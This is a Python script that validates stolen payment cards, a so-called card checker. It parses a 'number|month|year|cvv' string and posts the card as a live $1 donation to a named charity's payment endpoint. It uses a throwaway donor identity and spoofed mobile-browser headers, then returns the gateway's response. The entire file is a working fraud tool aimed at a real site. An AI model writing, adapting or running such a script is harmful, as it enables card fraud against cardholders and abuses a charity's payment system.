import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	cookies = {
	    '__cf_bm': 'YuY1XaSL_lsrsP8IB7I2GBIilo307RubQjbod.bxgbQ-1776313301-1.0.1.1-sbOw94gU9cSyuK2be.5DNWzUsYWQKeyP6KFQUKpf7pBcQVo.xtapd5c0nfggrzN3o_HaznzwZsQIHlKzo6XsxUWSH.pWfQy9xSQenUAsWS0',
	    '_cfuvid': 'qzTufKJ44MjrW_61dW827QYl7IopMVQFUHZXFWlGA.o-1776313301484-0.0.1.1-604800000',
	    '_fbp': 'fb.1.1776313304366.205384764409182557',
	    '__hstc': '164235424.9bbfcb6ee5bbceab45a6187fea12667f.1776313305991.1776313305991.1776313305991.1',
	    'hubspotutk': '9bbfcb6ee5bbceab45a6187fea12667f',
	    '__hssrc': '1',
	    '__hssc': '164235424.1.1776313305993',
	}
	
	headers = {
	    'authority': 'revelationmedia.com',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/json',
	    # 'cookie': '__cf_bm=YuY1XaSL_lsrsP8IB7I2GBIilo307RubQjbod.bxgbQ-1776313301-1.0.1.1-sbOw94gU9cSyuK2be.5DNWzUsYWQKeyP6KFQUKpf7pBcQVo.xtapd5c0nfggrzN3o_HaznzwZsQIHlKzo6XsxUWSH.pWfQy9xSQenUAsWS0; _cfuvid=qzTufKJ44MjrW_61dW827QYl7IopMVQFUHZXFWlGA.o-1776313301484-0.0.1.1-604800000; _fbp=fb.1.1776313304366.205384764409182557; __hstc=164235424.9bbfcb6ee5bbceab45a6187fea12667f.1776313305991.1776313305991.1776313305991.1; hubspotutk=9bbfcb6ee5bbceab45a6187fea12667f; __hssrc=1; __hssc=164235424.1.1776313305993',
	    'origin': 'https://revelationmedia.com',
	    'referer': 'https://revelationmedia.com/donation',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'firstName': 'Gen',
	    'lastName': 'Paypal',
	    'email': 'genpaypal01@gmail.com',
	    'phone': '+66817480630',
	    'donationMethod': 'Credit Card',
	    'amount': '1',
	    'campaign': 'Revelation Media',
	    'projectName': 'RevelationMedia - General',
	    'donationFrequency': 'onetime',
	    'sandbox': False,
	    'source_code': 'RevelationMedia',
	    'billingAddress': '27 Allen St',
	    'billingCity': 'New York',
	    'billingState': 'AL',
	    'billingZip': '10002',
	    'billingCountry': 'US',
	    'shippingFirstName': '',
	    'shippingLastName': '',
	    'shippingAddress': '',
	    'shippingCity': '',
	    'shippingState': '',
	    'shippingCountry': '',
	    'cardName': 'Gen Paypal',
	    'cardNumber': f'{n}',
	    'cardCvv': f'{cvc}',
	    'expiryMonth': f'{mm}',
	    'expiryYear': f'20{yy}',
	}
	
	response = requests.post(
	    'https://revelationmedia.com/_hcms/api/authorize_payment_sandbox',
	    #cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	
	result = response.json()['message']
	
	return result
